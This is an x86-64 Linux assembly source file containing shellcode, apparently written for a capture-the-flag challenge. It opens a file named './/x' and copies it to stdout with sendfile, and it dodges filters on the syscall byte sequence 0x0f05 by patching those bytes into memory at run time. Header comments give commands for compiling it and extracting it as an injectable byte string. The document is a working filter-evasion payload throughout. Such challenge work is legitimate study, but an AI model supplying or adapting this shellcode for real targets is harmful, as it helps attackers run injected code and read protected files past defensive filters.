#
# read-no-syscall.s - Linux/x86_64 sendfile without 0x0f05
# Copyright (c) 2025 Marco Ivaldi <raptor@0xdeadbeef.info>
#
# Simple shellcode inspired by a challenge that shall remain unnamed to 
# prevent spoilers.
#
# Useful commands:
# $ gcc -nostdlib -static shellcode.s -o shellcode-elf
# $ objdump -M intel -d shellcode-elf
# $ strace ./shellcode-elf # doesn't work with with self-modifying code
# $ objcopy --dump-section .text=shellcode-raw shellcode-elf
# $ xxd -p shellcode-raw | tr -d '\n' | sed 's/../\\x&/g'
#

.intel_syntax noprefix
.global _start

.text
_start:
    # open(".//x", O_RDONLY)
    push 0x782f2f2e
    push rsp
    pop rdi             # ".//x"

    push 1
    pop rsi
    dec esi             # 0 (O_RDONLY)

    # write syscall stub
    lea rbx, [rip + syscall_stub]
    mov rcx, 0x050e
    inc rcx
    mov [rbx], cx

    mov al, 2
    jmp rbx             # open

sendfile:
    # sendfile(1, fd, NULL, 1000)
    push 1
    pop rdi             # 1

    push rax
    pop rsi             # fd

    push 1
    pop rdx
    dec edx             # 0 (NULL)

    mov r10w, 1000      # 1000

    mov al, 40
    jmp rbx             # sendfile

syscall_stub:
    nop
    nop
    jmp sendfile
